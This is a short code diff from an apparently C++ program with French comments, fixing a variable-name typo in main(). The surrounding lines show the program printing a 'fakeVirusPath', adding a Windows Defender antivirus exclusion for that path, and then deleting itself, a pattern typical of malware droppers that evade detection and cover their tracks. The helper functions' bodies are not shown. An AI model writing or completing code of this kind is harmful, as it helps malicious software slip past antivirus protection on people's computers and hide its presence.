@@ -210,7 +210,7 @@ int main() {
     cout << fakeVirusPath << endl;
 
     // Ajouter une exclusion antivirus
-    AddDefenderExclusion(fakeVirusPaths);
+    AddDefenderExclusion(fakeVirusPath);
 
     // S'auto-supprimer
     SelfDelete();
